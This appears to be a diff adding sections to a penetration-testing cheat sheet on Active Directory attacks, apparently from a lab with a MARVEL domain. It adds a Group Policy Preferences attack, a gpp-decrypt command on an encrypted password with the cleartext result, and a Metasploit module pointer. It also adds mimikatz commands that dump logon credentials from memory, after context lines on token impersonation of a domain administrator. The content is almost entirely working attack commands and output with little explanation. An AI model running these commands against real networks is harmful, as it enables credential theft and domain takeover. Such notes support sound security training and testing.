@@ -90,3 +90,27 @@ impersonate_token MARVEL\\administrator # the DC must have been rebooted and adm
 ```
 
 Use rev2self to be again authority\_system
+
+
+
+## GPP attack
+
+
+
+```
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeX0sQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18
+```
+
+Or use msf smv\_enum\_gpp if you have user creds&#x20;
+
+
+
+## mimikatz
+
+```
+mimikatz # privilege::debug
+
+mimikatz # sekurlsa::logonPasswords
+
+```
